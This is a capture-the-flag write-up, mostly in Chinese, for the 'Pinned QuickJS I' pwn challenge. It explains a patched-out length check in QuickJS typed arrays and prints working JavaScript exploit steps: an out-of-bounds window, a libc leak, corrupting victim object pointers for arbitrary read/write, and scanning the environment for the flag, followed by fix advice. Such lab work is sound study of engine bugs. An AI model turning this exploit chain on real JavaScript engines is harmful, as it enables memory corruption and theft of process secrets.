# Pinned QuickJS I

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-F02C6EA9` · 状态 solved
```

## 一句话

The service runs a pinned QuickJS build behind a JSON-Lines TCP interface and keeps this instance's flag in the worker environment.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-F02C6EA9.zip` | 1.5 MB | `825d8f7cff60…` |
| `zip/patch.diff` | 513 B | `43160317f832…` |
| `zip/README.md` | 856 B | `392e55a23740…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 题面与附件

• 题目：Pinned QuickJS I，挑战 ID AUTHORED-F02C6EA9。
• 服务：TCP JSON-Lines，每次发送一行 {"code":"<javascript>"}，返回一行 {"ok":true,"result":...} 或 {"ok":false,"error":...}；每条连接一个 fresh worker。
• 目标：从 worker 进程环境中取回 QJS_CTF_FLAG，按原样提交。
• 附件：
• qjs_auth/quickjs-base-bundle.tar.gz：QuickJS 2026-06-04 底座、adapter/server.py、runner/qjs_runner.c。
• qjs_auth/patch.diff：线上二进制对应的生产补丁。
• 本实例服务地址为 172.16.53.2:1337，flag 格式为 «FLAG»。

### 观察与证据

1. 补丁把长度上界整个删掉了

qjs_auth/patch.diff:7-8：

-                if ((offset + (len << size_log2)) > abuf->byte_length) {

+                if (offset > abuf->byte_length) {

原来会同时检查 offset 和 len 是否落在 ArrayBuffer 内；补丁后只检查 offset <= byte_length。因此当 offset = 0 时，len 可以任意大，显式长度构造完全绕过 backing store 边界。

构造完成后，typed_array_init() 仍然按未校验的 len 设置字段（qjs_auth/third_party/quickjs/src/quickjs.c:59607）：

```
ta->offset = offset;
```

ta->length = len << size_log2;   // :59628

p->u.array.count = len;          // :59632

p->u.array.u.ptr = abuf->data + offset; // :59633

所以 new Uint32Array(ab, 0, 0x2000) 对 0x4000 字节的 ab 会得到 count = 0x2000、ptr = ab->data，实际可访问 0x2000 * 4 = 0x8000 字节，越过 backing store 0x4000 字节。

2. 整数下标走 fast path，绕开 OOB 检查

JS_GetPropertyValue() 的 typed-array fast path（qjs_auth/third_party/quickjs/src/quickjs.c:9030-9070）只做：

```
if (unlikely(idx >= p->u.array.count)) goto slow_path;
return JS_NewUint32(ctx, p->u.array.u.uint32_ptr[idx]);
```

它不会调用 typed_array_is_oob()（该函数在qjs_auth/third_party/quickjs/src/quickjs.c:57149，负责慢路径中的 backing-store 边界判断）。因此即使 view 实际越界，o[i] 仍能正常读写。

远程验证：

```js
var ab = new ArrayBuffer(16);
var o = new Uint32Array(ab, 0, 0x100);
JSON.stringify([o[0], o[4], o[100], o.length]);
```

返回：

[0,65593,65604,256]

o.length 是 256（0x100），而 backing store 只有 16 字节；o[4]、o[100] 已经读到堆上的相邻数据。

### 分析与验证

最终 payload 见 pinned_qjs1/exploit.js，驱动脚本见 pinned_qjs1/solve.py。核心链条如下。

**2.1 建立 OOB 窗口**

```js
var ab = new ArrayBuffer(0x4000);
var o  = new Uint32Array(ab, 0, 0x2000); // 0x8000 字节窗口
```

o 的整数下标覆盖 ab->data 起 0x8000 字节，其中后 0x4000 字节是 OOB 区域。

**2.2 从 unsorted bin 泄露 libc**

紧接着分配两个 0x4000 的 ArrayBuffer：

```js
var t = new ArrayBuffer(0x4000);
var guard = new ArrayBuffer(0x4000); // 阻止 t 与 top chunk 合并
t = null;
```

t 被释放后进入 glibc unsorted bin，其 fd/bk 指向 main_arena。由于 QuickJS 大块分配在 glibc user 指针前还有一个 8 字节的 JSMallocBlockHeader，t 的 glibc user 指针位于 OOB 窗口偏移 0x4008，所以：

```js
var fd = o[0x1003] * 0x100000000 + o[0x1002];
```

得到 libc 内的 unsorted-bin 指针。

**2.3 让 victim JSObject 落进 OOB 窗口**

分配一个小 buffer 和 600 个 view：

```js
var abv = new ArrayBuffer(0x100);
var U = new Uint8Array(abv);
U[0x80] = 0xAB;
var victims = [];
for (var i = 0; i < 600; i++)
victims.push(new Uint8Array(abv, 0, 32));
```

QuickJS 从释放的 chunk 中切出 4 KiB arena；每个 Uint8Array 的 JSObject 是 72 字节块，class_id 在 JSObject + 0x12（Uint8Array 的 class_id 为 23）。扫描 o 的 OOB 区域：

```js
for (var j = 0; j < 0x4000; j += 8) {
var off = 0x4000 + j;
var w = o[(off + 0x12) >> 2];
var cid = (w >>> (((off + 0x12) & 3) * 8)) & 0xffff;
if (cid == 23) hits.push(off);
}
```

命中的是 victim JSObject 的起始地址。

**2.4 篡改 victim 的 pointer/count**

以第一个命中 h0 为例：

```js
var pidx  = (h0 + 0x30) >> 2;       // u.array.u.ptr
var paddr = o[pidx] + o[pidx + 1] * 0x100000000;
var naddr = paddr + 0x80;           // 指向 abv + 0x80（marker 处）
o[pidx]     = naddr % 0x100000000;
o[pidx + 1] = (naddr - naddr % 0x100000000) / 0x100000000;
```

o[(h0 + 0x38) >> 2] = 0x100;        // u.array.count

随后在 600 个 victim 中找 victims[i][0] === 0xAB 的那个；它的 backing pointer 已被改成 abv+0x80，count 被改成 0x100，于是 victims[idx] 变成任意地址读写原语：

```js
function setptr(addr) {
var lo = addr % 0x100000000;
var hi = (addr - lo) / 0x100000000;
o[pidx] = lo;
o[pidx + 1] = hi;
}
function rd64(addr) {
setptr(addr);
var v = 0, m = 1;
for (var k = 0; k < 8; k++) { v += rw[k] * m; m *= 256; }
return v;
}
```

**2.5 找 libc、栈和 flag**

从 fd 向下按页扫描 \x7fELF 找 libc 基址；解析 ELF program headers，选取可写 PT_LOAD，在其中扫描指向栈的 8 字节值。候选可能是：

• __environ：直接指向 envp 数组；
• __libc_stack_end / &argc：需要按 argc 推算出 envp = &argc + 8 + (argc + 1) * 8 + 8。

然后遍历 envp，对每个环境字符串调用 rdstr，匹配 QJS_CTF_FLAG=：

```
if (s.indexOf("QJS_CTF_FLAG=") >= 0) { flag = s; break; }
```

完整实现见 pinned_qjs1/exploit.js:107-163。

### 结果

远程返回：

```
QJS_CTF_FLAG=«FLAG»
```

Flag：

«FLAG»

平台提交结果：

```
{"correct":true,"solve_time_s":262.3,"solve_rank":73,"challenge_fully_solved":true}
```

复现：

```bash
python pinned_qjs1/solve.py
```

脚本默认连接 172.16.53.2:1337，可通过 QJS_HOST / QJS_PORT 覆盖。

### 修复建议

1. 恢复完整边界检查，并使用 64 位无符号运算避免加法溢出：

```
if (offset > abuf->byte_length ||
```

len > ((uint64_t)abuf->byte_length - offset) >> size_log2)

```
goto invalid_length;
```

2. 对 resizable ArrayBuffer，在 view 创建后仍需在每次元素访问时依据当前 byte_length 校验，或保证 typed_array_init 的 count/ptr 不会被后续 resize 破坏。
3. 若目标是防御此类 fast-path 绕过，typed-array 的整数下标读写也应调用 typed_array_is_oob()，而不是只检查 idx < count。

## 结果

- flag sha256：`1716cf69dbeae554ba1e73e63515ff96b18e994469ac9fb0a2bd3140bef9d828`, `9b3e246d1b8a8236c79dca006056efb504a5496401ca79176befea1726928c76`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/solve.py`
- `solve/exploit.js`

## 待核实

- 本条目由 WP 第 24 节《Pinned QuickJS I》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
